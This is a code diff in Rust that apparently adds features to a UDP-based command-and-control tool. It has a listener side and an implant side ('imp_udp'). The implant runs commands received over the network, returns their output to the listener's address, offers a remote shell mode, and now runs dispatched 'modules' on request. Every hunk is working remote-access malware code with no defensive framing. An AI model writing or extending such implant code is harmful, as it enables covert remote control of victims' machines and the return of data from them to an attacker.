@@ -20,6 +20,7 @@ use std::sync::{Arc, Mutex};
 use std::time::Duration;
 use std::thread;
 use std::path::Path;
+use std::str;
 
 /*****************************/
 /*     USEFUL STRUCTURES     */
@@ -210,6 +211,25 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                     is_interacting = true;
                     let code: u8 = 2;
                     lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
+                },
+                // tell the shell to execute a module
+                6 => {
+                    let mut flag: bool = true;
+                    while flag {
+                        let mut sb_copy = sb.lock().unwrap();
+                        if !vec_is_zero(&sb_copy.buff) {
+                            let code: u8 = 3;
+                            lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
+                            lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
+                            let mut output = [0; 2048];
+                            lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output);
+                            sb_copy.buff = output.to_vec();
+                            flag = false;
+                        }
+                        else {
+                            thread::sleep(Duration::from_millis(10));
+                        }
+                    }
                 },
                 _u8 => todo!(),
             }
@@ -542,10 +562,23 @@ fn imp_udp(lsn_addr: SocketAddr) {
                     };
                     if bytes != 0 {
                         let cmd_res: String = execute_cmd(String::from_utf8_lossy(&buffer[..]).as_ref().to_string());
+                        sock.send_to(cmd_res.as_bytes(), lsn_addr);
                     }
                 },
                 // begin shell mode
                 2 => udp_shell(&mut sock),
+                // execute module
+                3 => {
+                    buffer = [0; 2048];
+                    let (bytes, src) = match sock.recv_from(&mut buffer) {
+                        Ok((b, s)) => (b, s),
+                        Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
+                    };
+                    if bytes != 0 {
+                        let cmd_res = usr_mods::dispatch(str::from_utf8(&buffer[..]).unwrap());
+                        sock.send_to(&cmd_res, lsn_addr);
+                    }
+                },
                 _u8 => todo!(),
             }
         }
